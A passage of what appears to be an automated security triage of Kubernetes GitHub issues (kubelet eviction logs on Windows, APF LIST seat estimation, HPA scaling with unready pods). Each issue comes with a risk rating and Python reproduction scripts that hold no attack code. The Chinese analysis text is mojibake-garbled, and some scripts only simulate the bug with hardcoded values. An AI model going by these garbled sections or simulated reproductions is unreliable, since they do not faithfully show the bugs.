        "cacheUnauthorizedTTL": "30s"
      }
    },
    "registryPullQPS": 5,
    "registryBurst": 10,
    "eventRecordQPS": 50,
    "eventBurst": 100,
    "enableDebuggingHandlers": true,
    "healthzPort": 10248,
    "healthzBindAddress": "127.0.0.1",
    "oomScoreAdj": -999,
    "clusterDomain": "cluster.local",
    "clusterDNS": [
      "172.30.0.10"
    ],
    "streamingConnectionIdleTimeout": "4h0m0s",
    "nodeStatusUpdateFrequency": "10s",
    "nodeStatusReportFrequency": "5m0s",
    "nodeLeaseDurationSeconds": 40,
    "imageMinimumGCAge": "2m0s",
    "imageMaximumGCAge": "0s",
    "imageGCHighThresholdPercent": 85,
    "imageGCLowThresholdPercent": 80,
    "volumeStatsAggPeriod": "1m0s",
    "cgroupsPerQOS": false,
    "cgroupDriver": "cgroupfs",
    "cpuManagerPolicy": "none",
    "cpuManagerReconcilePeriod": "10s",
    "memoryManagerPolicy": "None",
    "topologyManagerPolicy": "none",
    "topologyManagerScope": "container",
    "runtimeRequestTimeout": "10m0s",
    "hairpinMode": "promiscuous-bridge",
    "maxPods": 250,
    "podPidsLimit": -1,
    "resolvConf": "",
    "cpuCFSQuota": true,
    "cpuCFSQuotaPeriod": "100ms",
    "nodeStatusMaxImages": 50,
    "maxOpenFiles": 1000000,
    "contentType": "application/vnd.kubernetes.protobuf",
    "kubeAPIQPS": 50,
    "kubeAPIBurst": 100,
    "serializeImagePulls": false,
    "evictionHard": {
      "imagefs.available": "15%",
      "memory.available": "500Mi",
      "nodefs.available": "10%"
    },
    "evictionPressureTransitionPeriod": "5m0s",
    "enableControllerAttachDetach": true,
    "makeIPTablesUtilChains": true,
    "iptablesMasqueradeBit": 14,
    "iptablesDropBit": 15,
    "featureGates": {
      "RotateKubeletServerCertificate": true
    },
    "failSwapOn": true,
    "memorySwap": {},
    "containerLogMaxSize": "50Mi",
    "containerLogMaxFiles": 5,
    "containerLogMaxWorkers": 1,
    "containerLogMonitorInterval": "10s",
    "configMapAndSecretChangeDetectionStrategy": "Watch",
    "systemReserved": {
      "cpu": "500m",
      "ephemeral-storage": "1Gi",
      "memory": "1Gi"
    },
    "volumePluginDir": "/usr/libexec/kubernetes/kubelet-plugins/volume/exec/",
    "logging": {
      "format": "text",
      "flushFrequency": "5s",
      "verbosity": 4,
      "options": {
        "text": {
          "infoBufferSize": "0"
        },
        "json": {
          "infoBufferSize": "0"
        }
      }
    },
    "enableSystemLogHandler": true,
    "enableSystemLogQuery": true,
    "shutdownGracePeriod": "0s",
    "shutdownGracePeriodCriticalPods": "0s",
    "crashLoopBackOff": {},
    "enableProfilingHandler": true,
    "enableDebugFlagsHandler": true,
    "seccompDefault": false,
    "memoryThrottlingFactor": 0.9,
    "registerWithTaints": [
      {
        "key": "os",
        "value": "Windows",
        "effect": "NoSchedule"
      }
    ],
    "registerNode": true,
    "localStorageCapacityIsolation": true,
    "containerRuntimeEndpoint": "npipe://./pipe/containerd-containerd",
    "failCgroupV1": false
  }
}

```

#### Kubernetes version

v1.32.1

#### Cloud provider

Any, not relevant


#### OS version


On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture

```
BuildNumber  Caption                                                                 OSArchitecture  Version     
20348                Microsoft Windows Server 2022 Standard    64-bit                     10.0.20348 
```


#### Container runtime (CRI) and version (if applicable)

```
containerd
version=v1.7.25
revision=bcc810d6b9066471b0b6fa75f557a15a1cbf31bb
```


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯åœ¨ Windows ç¯å¢ƒä¸‹è¿è¡Œ v1.32.1 ç‰ˆæœ¬çš„ kubelet æ—¶ï¼Œä¼šé¢‘ç¹è¾“å‡º "Eviction manager: no observation found for eviction signal" çš„æ—¥å¿—ï¼ŒåŸå› æ˜¯è¯¥å¹³å°ä¸æ”¯æŒ containerfs.inodesFree ä¿¡å·ã€‚é—®é¢˜æœ¬è´¨ä¸Šå±äºæ—¥å¿—å†—ä½™æˆ–é…ç½®ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå¹¶æ— å‘½ä»¤æ‰§è¡Œã€æƒé™æå‡ã€DoS æ”»å‡»ã€å®¹å™¨é€ƒé€¸ç­‰å®‰å…¨é£é™©ï¼Œå› æ­¤ä¸æ¶‰åŠå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python
"""
è¯¥è„šæœ¬ä»…ç”¨äºæ¼”ç¤ºæ—¥å¿—é”™è¯¯çš„æƒ…å†µï¼Œç”±äºé—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œ
æ•…æ­¤å¤ç°è„šæœ¬ä¸åŒ…å«ä»»ä½•å®‰å…¨æ¼æ´æ”»å‡»ä»£ç ï¼Œä»…ç”¨äºæ¨¡æ‹Ÿæ£€æŸ¥æ—¥å¿—ä¸­æ˜¯å¦å­˜åœ¨é”™è¯¯ä¿¡æ¯ã€‚
"""

import time
import threading

# æ¨¡æ‹Ÿ kubelet æ—¥å¿—æ‰“å°å‡½æ•°
def simulate_kubelet_logs():
    # æ¨¡æ‹Ÿæ—¥å¿—å†…å®¹ä¸­åŒ…å«é”™è¯¯æç¤ºä¿¡æ¯
    error_message = "Eviction manager: no observation found for eviction signal signal=\"containerfs.inodesFree\""
    # æ¨¡æ‹Ÿæ¯20ç§’æ‰“å°ä¸€æ¬¡ï¼Œæ•´ä¸ªæ¼”ç¤ºæŒç»­1åˆ†é’Ÿåé€€å‡º
    for _ in range(3):
        print(time.strftime("%Y-%m-%d %H:%M:%S"), error_message)
        time.sleep(20)

def main():
    # å¯åŠ¨æ—¥å¿—æ¨¡æ‹Ÿçº¿ç¨‹
    log_thread = threading.Thread(target=simulate_kubelet_logs)
    log_thread.start()
    # è®¾å®šè¶…æ—¶æ—¶é—´ä¸º70ç§’ï¼Œç¡®ä¿è„šæœ¬æ‰§è¡Œç»“æŸ
    log_thread.join(timeout=70)
    print("æ—¥å¿—æ¨¡æ‹Ÿç»“æŸï¼Œé—®é¢˜ä»…ä¸ºæ—¥å¿—å¤šä½™è®°å½•ï¼Œä¸å­˜åœ¨å®é™…å®‰å…¨é£é™©ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œ
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. æœ¬è„šæœ¬æ¨¡æ‹Ÿäº† kubelet åœ¨ Windows å¹³å°ä¸‹ç”±äºä¸æ”¯æŒ containerfs.inodesFree ä¿¡å·è€Œæ‰“å°é”™è¯¯æ—¥å¿—çš„æƒ…å†µã€‚  
2. è„šæœ¬ä¸­é€šè¿‡ simulate_kubelet_logs å‡½æ•°æ¯éš”20 ç§’æ‰“å°ä¸€æ¬¡é”™è¯¯æ—¥å¿—ï¼Œå…±æ‰“å°ä¸‰æ¬¡ï¼Œæ€»æ—¶é•¿çº¦ä¸º1åˆ†é’Ÿã€‚  
3. ç”±äºè¯¥é—®é¢˜ä¸æ¶‰åŠä»»ä½•å®‰å…¨æ¼æ´æˆ–é«˜é£é™©æ“ä½œï¼Œå› æ­¤ä»…ç”¨äºæ—¥å¿—é”™è¯¯è¾“å‡ºæ¨¡æ‹Ÿï¼Œä¸å«æœ‰ä»»ä½•ç ´åæ€§æˆ–åˆ©ç”¨ä»£ç ã€‚  
4. è„šæœ¬ä½¿ç”¨ threading å’Œ join çš„æ–¹å¼ç¡®ä¿åœ¨70ç§’å†…è‡ªåŠ¨é€€å‡ºï¼Œç¬¦åˆæ‰§è¡Œè¶…æ—¶æœºåˆ¶è¦æ±‚ã€‚

---


## Issue #130139 APIServer APF estimates cost for LIST not work

- Issue é“¾æ¥ï¼š[#130139](https://github.com/kubernetes/kubernetes/issues/130139)

### Issue å†…å®¹

#### What happened?

According to the documentation https://kubernetes.io/docs/concepts/cluster-administration/flow-control/#seats-occupied-by-a-request , the APIServer's APF (API Priority and Fairness) calculates seats for each request as a reference to measure the consumption of each API. Specifically, List requests determine the number of seats based on the number of objects returned.

However, in actual usage, I have observed that all List requests (regardless of the number of objects) are assigned only 1 seat by APF.
For example, I have 1w+ pods in cluster,  seat expected to be 10.
```
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="1"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="2"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="4"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="10"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="+Inf"} 84
```

I found that the seat calculation for List requests happens at 

https://github.com/kubernetes/kubernetes/blob/2642d8222d8524133ce21fe195edd1a1912090db/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/request/list_work_estimator.go#L50

and every request hit the error:
https://github.com/kubernetes/kubernetes/blob/2642d8222d8524133ce21fe195edd1a1912090db/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/request/list_work_estimator.go#L100
.

So I add some debug log in `objectCountTracker ` set, found that `objectCountTracker` is nil, so it will never update the object count, which will cause `ObjectCountNotFoundErr` in APF list estimator.

https://github.com/kubernetes/kubernetes/blob/2642d8222d8524133ce21fe195edd1a1912090db/staging/src/k8s.io/apiserver/pkg/registry/generic/registry/store.go#L1673-L1675


#### What did you expect to happen?

In APF (API Priority and Fairness), the seats for a List request should increase with the number of objects returned, rather than always being 1.

#### How can we reproduce it (as minimally and precisely as possible)?

There is my apf config.

```
apiVersion: flowcontrol.apiserver.k8s.io/v1beta3
kind: PriorityLevelConfiguration
metadata:
  name: list-pods
spec:
  limited:
    nominalConcurrencyShares: 1
    borrowingLimitPercent: 0
    limitResponse:
      queuing:
        handSize: 5
        queueLengthLimit: 0
        queues: 5
      type: Queue
  type: Limited
---
apiVersion: flowcontrol.apiserver.k8s.io/v1beta3
kind: FlowSchema
metadata:
  name: list-pods
spec:
  distinguisherMethod:
    type: ByUser
  matchingPrecedence: 100
  priorityLevelConfiguration:
    name: list-pods
  rules:
  - resourceRules:
    - apiGroups:
      - '*'
      clusterScope: true
      namespaces:
      resources:
      - pods
      verbs:
      - list
    subjects:
    - group:
        name: system:authenticated
      kind: Group

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°äº† Kubernetes API Server çš„ APFï¼ˆAPI Priority and Fairnessï¼‰åœ¨å¤„ç† List è¯·æ±‚æ—¶çš„åº§ä½ï¼ˆseatï¼‰ä¼°ç®—é—®é¢˜ï¼Œå®é™…æƒ…å†µæ˜¯æ— è®ºè¿”å›çš„å¯¹è±¡æ•°é‡å¦‚ä½•ï¼ŒAPF å§‹ç»ˆåªåˆ†é… 1 ä¸ª seatã€‚ç»è¿‡è°ƒè¯•å‘ç°ï¼ŒåŸå› æ˜¯ APIServer åœ¨è®¡ç®— List è¯·æ±‚åº§ä½æ—¶æ‰€ä¾èµ–çš„ objectCountTracker å‡ºç°äº† nil çš„æƒ…å†µï¼Œå¯¼è‡´æ— æ³•æ­£ç¡®è·å–å¯¹è±¡æ•°ï¼Œä»è€Œè§¦å‘ ObjectCountNotFoundErrï¼Œæœ€ç»ˆå¯¼è‡´åº§ä½è®¡ç®—å¿½ç•¥äº†å®é™…çš„å¯¹è±¡æ•°ã€‚æ€»ä½“æ¥çœ‹ï¼Œè¿™å±äºåŠŸèƒ½æ€§ bugï¼Œä¸»è¦å½±å“èµ„æºè°ƒåº¦å’Œæµæ§è¡Œä¸ºï¼Œä¸ç›´æ¥æ¶‰åŠæœªæˆæƒè®¿é—®ã€å‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰å®‰å…¨é—®é¢˜ï¼Œä¹Ÿæ²¡æœ‰å½¢æˆæ˜æ˜¾çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»å‘é‡ã€‚å› æ­¤ï¼Œæ­¤ issue ä¸å±äºå®‰å…¨é—®é¢˜ï¼Œå…¶é£é™©ç‚¹ä¸»è¦åœ¨äºé”™è¯¯çš„æµæ§é…ç½®å¯èƒ½å¯¼è‡´å¼‚å¸¸çš„è¯·æ±‚è°ƒåº¦ï¼Œä½†è¯¥é—®é¢˜æœ¬èº«å¹¶ä¸ä¼šäº§ç”Ÿä¸¥é‡å®‰å…¨å½±å“ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
"""
è¯¥è„šæœ¬ä½¿ç”¨ python çš„ kubernetes å®¢æˆ·ç«¯æ¨¡æ‹Ÿ List è¯·æ±‚ï¼Œæ¼”ç¤ºå½“é›†ç¾¤ä¸­å¯¹è±¡æ•°é‡è¾ƒå¤šæ—¶ï¼Œ
æœŸæœ›çš„ APF åº§ä½å€¼ï¼ˆæ ¹æ®å¯¹è±¡æ•°é‡ï¼‰ä¸å®é™…ç”±äº bug å¯¼è‡´å›ºå®šè¿”å› 1 çš„ç°è±¡ã€‚
è¯¥è„šæœ¬ä»…ç”¨äºç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•ï¼ŒåŠ¡å¿…åœ¨æµ‹è¯•ç¯å¢ƒä¸­è¿è¡Œã€‚
"""

import math
import threading
import signal
import sys
import time
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# è®¾ç½®è¶…æ—¶ï¼ˆæ€»æ‰§è¡Œæ—¶é—´ä¸è¶…è¿‡ 2 åˆ†é’Ÿï¼‰
EXECUTION_TIMEOUT = 120

def timeout_handler(signum, frame):
    print("è„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼Œé€€å‡ºã€‚")
    sys.exit(1)

def run_timeout():
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(EXECUTION_TIMEOUT)

def get_all_pods():
    """
    ä½¿ç”¨ kubernetes Python å®¢æˆ·ç«¯è·å–é›†ç¾¤æ‰€æœ‰ Pod çš„åˆ—è¡¨ï¼Œå¹¶è¿”å› pod æ•°é‡ï¼›
    è‹¥å› æƒé™ç­‰é—®é¢˜æœªèƒ½è·å–å…¨éƒ¨ Podï¼Œåˆ™æ‰“å°é”™è¯¯ä¿¡æ¯ã€‚
    """
    try:
        v1 = client.CoreV1Api()
        ret = v1.list_pod_for_all_namespaces(watch=False)
        pod_count = len(ret.items)
        return pod_count
    except ApiException as e:
        print("è·å– Pod åˆ—è¡¨å¼‚å¸¸: %s\n" % e)
        return None

def simulate_apf_seat_estimation(pod_count):
    """
    æ¨¡æ‹Ÿ APF å¯¹ List è¯·æ±‚åº§ä½çš„ä¼°ç®—ã€‚
    æ ¹æ® Kubernetes æµæ§æ–‡æ¡£ï¼Œé¢„æœŸåº§ä½æ•°åº”ä¸è¿”å›å¯¹è±¡æ•°ç›¸å…³ï¼ˆä¾‹å¦‚ 1w+ Pods å¯èƒ½æœŸæœ› 10 ä¸ªåº§ä½ï¼‰ï¼Œ
    ä½†å®é™… bug å¯¼è‡´å§‹ç»ˆåªè¿”å› 1ã€‚
    æ­¤å¤„æˆ‘ä»¬å‡è®¾ï¼šé¢„æœŸåº§ä½æ•°ä¸º math.ceil(pod_count / 1000)ï¼ˆä»…ä¸ºç¤ºä¾‹ç®—æ³•ï¼‰ã€‚
    å®é™…è¿”å›å€¼åˆ™å›ºå®šä¸º 1ï¼Œæ¥æ¨¡æ‹Ÿè¯¥ bugã€‚
    """
    if pod_count is None:
        return None, None
    expected_seats = math.ceil(pod_count / 1000) if pod_count > 0 else 1
    actual_seats = 1  # æ¨¡æ‹Ÿå›  objectCountTracker nil è€Œå¯¼è‡´çš„ bugï¼šå§‹ç»ˆè¿”å›1
    return expected_seats, actual_seats

def main():
    # è®¾ç½®æ‰§è¡Œæ€»è¶…æ—¶
    run_timeout()

    # åŠ è½½é›†ç¾¤é…ç½®ï¼ˆå‡è®¾ kubeconfig ä½äºé»˜è®¤ä½ç½®ï¼‰
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig é…ç½®å¤±è´¥: %s" % e)
        sys.exit(1)

    print("æ­£åœ¨è·å–é›†ç¾¤ä¸­æ‰€æœ‰ Pod åˆ—è¡¨...")
    pod_count = get_all_pods()
    if pod_count is None:
        print("æ— æ³•è·å– Pod æ•°é‡ï¼Œé€€å‡ºã€‚")
        sys.exit(1)
    print("é›†ç¾¤ä¸­ Pod æ•°é‡ï¼š%d" % pod_count)

    expected, actual = simulate_apf_seat_estimation(pod_count)
    if expected is None:
        print("è®¡ç®—åº§ä½æ•°å¼‚å¸¸ã€‚")
        sys.exit(1)

    print("æ ¹æ® Pod æ•°é‡ï¼Œé¢„æœŸ APF åº§ä½æ•°åº”ä¸ºï¼ˆç¤ºä¾‹ç®—æ³•ï¼‰ï¼š%d" % expected)
    print("å®é™… APF åˆ†é…çš„åº§ä½æ•°ä¸ºï¼š%d" % actual)

    if expected != actual:
        print("æ£€æµ‹åˆ° APF åº§ä½æ•°è®¡ç®—å¼‚å¸¸ï¼Œå¯èƒ½å­˜åœ¨ bugã€‚")
    else:
        print("APF åº§ä½æ•°è®¡ç®—è¡Œä¸ºæ­£å¸¸ã€‚")

    # ç¨‹åºé€€å‡ºå‰ç­‰å¾…å‡ ç§’é’Ÿä»¥ä¾¿è§‚å¯Ÿè¾“å‡º
    time.sleep(3)

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œè„šæœ¬
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. è„šæœ¬é¦–å…ˆè®¾ç½®äº†ä¸€ä¸ªæ€»æ‰§è¡Œè¶…æ—¶ä¸º 120 ç§’ï¼ˆ2 åˆ†é’Ÿï¼‰ï¼Œç¡®ä¿ä¸ä¼šå› æ— é™ç­‰å¾…è€Œå¯¼è‡´æ­»å¾ªç¯ã€‚
2. é€šè¿‡ kubernetes Python å®¢æˆ·ç«¯åŠ è½½ kubeconfigï¼ˆå‡å®šä½äºé»˜è®¤ä½ç½®ï¼‰ï¼Œå¹¶ä½¿ç”¨ CoreV1Api è·å–é›†ç¾¤ä¸­æ‰€æœ‰ Pod çš„æ•°é‡ã€‚  
3. æ¨¡æ‹Ÿ APF å¯¹ List è¯·æ±‚çš„åº§ä½ä¼°ç®—ã€‚ç¤ºä¾‹ä¸­é‡‡ç”¨ç®€å•çš„ç®—æ³•ï¼šé¢„æœŸåº§ä½æ•°ä¸º math.ceil(pod_count / 1000)ï¼ˆä»…ä¸ºå‚è€ƒç®—æ³•ï¼‰ï¼Œä½†å®é™…è¿”å›å€¼å›ºå®šä¸º 1ï¼Œä»¥æ¨¡æ‹Ÿ issue ä¸­æè¿°çš„ bugã€‚
4. è„šæœ¬æœ€åå°†é¢„æœŸä¸å®é™…è®¡ç®—çš„åº§ä½æ•°è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è¾“å‡ºæ£€æµ‹ç»“æœã€‚
5. è¯¥å¤ç°è„šæœ¬ç”¨äºéªŒè¯ APF åº§ä½ä¼°ç®—è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ï¼Œä»è€Œå¸®åŠ©é‡ç°è¯¥é—®é¢˜çš„ç°è±¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤è„šæœ¬ä»…ç”¨äºç ”ç©¶å’Œæœ¬åœ°æµ‹è¯•ï¼Œä¸”ä»…æ¨¡æ‹Ÿæ­¤åŠŸèƒ½æ€§ bugï¼Œå¹¶æœªå®é™…è®¿é—®æˆ–ç¯¡æ”¹ APIServer å†…éƒ¨é€»è¾‘ã€‚

---


## Issue #130130 [HorizontalPodAutoscaler] Cannot scale up when all pods are not ready

- Issue é“¾æ¥ï¼š[#130130](https://github.com/kubernetes/kubernetes/issues/130130)

### Issue å†…å®¹

#### What happened?

One of our production pool cannot scale up when its metrics reached its threshold because all pods became all unready at that moment when there was a peak traffic. Dig into the source code, we found that HPA calculate the desired replica using the ready pod count so cause the recommend replica is always 0.
```
func (c *ReplicaCalculator) getUsageRatioReplicaCount(currentReplicas int32, usageRatio float64, namespace string, selector labels.Selector) (replicaCount int32, timestamp time.Time, err error) {
	if currentReplicas != 0 {
		if math.Abs(1.0-usageRatio) <= c.tolerance {
			// return the current replicas if the change would be too small
			return currentReplicas, timestamp, nil
		}
		readyPodCount := int64(0)
		readyPodCount, err = c.getReadyPodsCount(namespace, selector)
		if err != nil {
			return 0, time.Time{}, fmt.Errorf("unable to calculate ready pods: %s", err)
		}
		replicaCount = int32(math.Ceil(usageRatio * float64(readyPodCount)))
	} else {
		// Scale to zero or n pods depending on usageRatio
		replicaCount = int32(math.Ceil(usageRatio))
	}

	return replicaCount, timestamp, err
}
```

#### What did you expect to happen?

Could you please help explain why to use the ready count and is there any way to refine the implement?

#### How can we reproduce it (as minimally and precisely as possible)?

Create a deployment with all unready pods. Or perform the performance test to a deployment and make all pods under it crash.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.4", GitCommit:"fa3d7990104d7c1f16943a67f11b154b71f6a132", GitTreeState:"clean", BuildDate:"2023-07-19T12:20:54Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"darwin/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"28+", GitVersion:"v1.28.12-86+f93862c0382718-dirty", GitCommit:"f93862c038271868c434c93cbae3d08e06ca281f", GitTreeState:"dirty", BuildDate:"2024-12-12T23:30:33Z", GoVersion:"go1.22.5", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue åæ˜ çš„æ˜¯ HorizontalPodAutoscalerï¼ˆHPAï¼‰çš„ä¸€ä¸ªé€»è¾‘ç¼ºé™·ï¼šåœ¨æ‰€æœ‰ pod å‡å¤„äº unready çŠ¶æ€æ—¶ï¼ŒHPA åœ¨æ ¹æ® ready pod æ•°é‡æ¥è®¡ç®—æ–°çš„å‰¯æœ¬æ•°ç”±æ­¤å¯¼è‡´æ¨èå‰¯æœ¬æ•°å§‹ç»ˆä¸º 0ï¼Œä»è€Œæ— æ³•è¿›è¡Œ scale upã€‚  
ç»åˆ†æï¼Œè¯¥é—®é¢˜æœ¬èº«å±äºåº”ç”¨é€»è¾‘ä¸Šçš„ bugï¼Œè™½ç„¶å¯èƒ½å¯¼è‡´åœ¨æµé‡é«˜å³°æ—¶æœåŠ¡å› æ‰©å®¹å¤±è´¥è€Œå‡ºç°ä¸å¯ç”¨æƒ…å†µï¼Œä½†å¹¶ä¸æ¶‰åŠæ”»å‡»è€…åˆ©ç”¨æ¼æ´è¿›è¡Œæœªæˆæƒæ“ä½œã€è¿œç¨‹ä»£ç æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰å®‰å…¨é—®é¢˜ï¼Œå› æ­¤ä¸å­˜åœ¨ç›´æ¥çš„å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
import time
import math
import traceback
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# è¶…æ—¶æœºåˆ¶ï¼Œæ•´ä¸ªè„šæœ¬è¿è¡Œä¸è¶…è¿‡100ç§’
import signal

def handler(signum, frame):
    print("è„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼Œé€€å‡ºã€‚")
    exit(1)

signal.signal(signal.SIGALRM, handler)
signal.alarm(100)

def create_namespace(api_instance, namespace):
    ns = client.V1Namespace(
        metadata=client.V1ObjectMeta(
            name=namespace
        )
    )
    try:
        api_instance.create_namespace(ns)
        print(f"Namespace '{namespace}' åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        if e.status == 409:
            print(f"Namespace '{namespace}' å·²å­˜åœ¨")
        else:
            raise

def delete_namespace(api_instance, namespace):
    try:
        api_instance.delete_namespace(name=namespace)
        print(f"Namespace '{namespace}' åˆ é™¤è¯·æ±‚å·²å‘é€")
    except ApiException as e:
        print(f"åˆ é™¤ Namespace æ—¶å¼‚å¸¸: {e}")

def create_deployment(apps_api, namespace, deployment_name):
    # åˆ›å»ºä¸€ä¸ª Deploymentï¼Œä½¿ç”¨ busybox é•œåƒï¼Œå¹¶è®¾ç½® readinessProbe å§‹ç»ˆå¤±è´¥ï¼ˆå‘½ä»¤ "false" è¿”å›é0ï¼‰
    container = client.V1Container(
        name="fail-readiness",
        image="busybox",
        args=["/bin/sh", "-c", "while true; do sleep 5; done"],
        readiness_probe=client.V1Probe(
            _exec=client.V1ExecAction(
                command=["false"]
            ),
            initial_delay_seconds=2,
            period_seconds=3
        )
    )

    template = client.V1PodTemplateSpec(
        metadata=client.V1ObjectMeta(labels={"app": deployment_name}),
        spec=client.V1PodSpec(containers=[container])
    )

    spec = client.V1DeploymentSpec(
        replicas=2,
        selector=client.V1LabelSelector(match_labels={"app": deployment_name}),
        template=template
    )

    deployment = client.V1Deployment(
        metadata=client.V1ObjectMeta(name=deployment_name),
        spec=spec
    )
    try:
        apps_api.create_namespaced_deployment(namespace=namespace, body=deployment)
        print(f"Deployment '{deployment_name}' åœ¨ Namespace '{namespace}' åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        print(f"åˆ›å»º Deployment æ—¶å¼‚å¸¸: {e}")
        traceback.print_exc()

def create_hpa(autoscaling_api, namespace, deployment_name, hpa_name):
    # åˆ›å»ºä¸€ä¸ª HorizontalPodAutoscalerï¼Œç›®æ ‡æ˜¯ CPU åˆ©ç”¨ç‡ï¼Œè¿™é‡Œä»…ç”¨äºæ¼”ç¤ºï¼Œå®é™…åœºæ™¯éœ€è¦Metrics Serveræ”¯æŒ
    metric_spec = client.V2MetricSpec(
        type="Resource",
        resource=client.V2ResourceMetricSource(
            name="cpu",
            target=client.V2MetricTarget(
                type="Utilization",
                average_utilization=50
            )
        )
    )
    hpa_spec = client.V2HorizontalPodAutoscalerSpec(
        scale_target_ref=client.V2CrossVersionObjectReference(
            api_version="apps/v1",
            kind="Deployment",
            name=deployment_name
        ),
        min_replicas=1,
        max_replicas=5,
        metrics=[metric_spec]
    )
    hpa = client.V2HorizontalPodAutoscaler(
        metadata=client.V1ObjectMeta(
            name=hpa_name
        ),
        spec=hpa_spec
    )
    try:
        autoscaling_api.create_namespaced_horizontal_pod_autoscaler(namespace=namespace, body=hpa)
        print(f"HPA '{hpa_name}' åœ¨ Namespace '{namespace}' åˆ›å»ºæˆåŠŸ")
    except ApiException as e:
        print(f"åˆ›å»º HPA æ—¶å¼‚å¸¸: {e}")
        traceback.print_exc()

def simulate_ready_count_issue(current_replicas, usage_ratio, ready_pod_count, tolerance=0.1):
    # æ¨¡æ‹Ÿ HPA ä¸­ä½¿ç”¨ ready pod count è®¡ç®—å‰¯æœ¬æ•°çš„é€»è¾‘
    if current_replicas != 0:
        if math.fabs(1.0 - usage_ratio) <= tolerance:
            return current_replicas
        replica_count = int(math.ceil(usage_ratio * ready_pod_count))
    else:
        replica_count = int(math.ceil(usage_ratio))
    return replica_count

def main():
    # åŠ è½½é»˜è®¤çš„ kubeconfig é…ç½®æ–‡ä»¶
    config.load_kube_config()
    core_v1 = client.CoreV1Api()
    apps_v1 = client.AppsV1Api()
    autoscaling_v2 = client.AutoscalingV2Api()
    
    namespace = "hpa-test"
    deployment_name = "demo-deployment"
    hpa_name = "demo-hpa"
    
    try:
        # åˆ›å»ºæµ‹è¯•å‘½åç©ºé—´
        create_namespace(core_v1, namespace)
    
        # åˆ›å»ºæ•…æ„è®¾ç½® ReadinessProbe å§‹ç»ˆå¤±è´¥çš„ Deployment
        create_deployment(apps_v1, namespace, deployment_name)
        
        # åˆ›å»º HPA å¯¹è¯¥ Deployment è¿›è¡Œç›‘æ§ï¼ˆè¿™é‡Œä¾èµ– Metrics Server å®é™…æ•°æ®ï¼Œæœ¬è„šæœ¬ä»…ç”¨äºå¤ç°ç¯å¢ƒæ­å»ºï¼‰
        create_hpa(autoscaling_v2, namespace, deployment_name, hpa_name)
        
        # ç­‰å¾…ä¸€æ®µæ—¶é—´è®© Pod è¿›å…¥ Running çŠ¶æ€ï¼Œä½† Readiness ä¸é€šè¿‡
        print("ç­‰å¾… 20 ç§’ä»¥ç¡®ä¿ Pod è¿›å…¥ Running çŠ¶æ€ä½†ä»å¤„äº unready çŠ¶æ€...")
        time.sleep(20)
        
        # æŸ¥è¯¢ Pod çŠ¶æ€ï¼ŒéªŒè¯æ‰€æœ‰ Pod å‡ä¸º unready
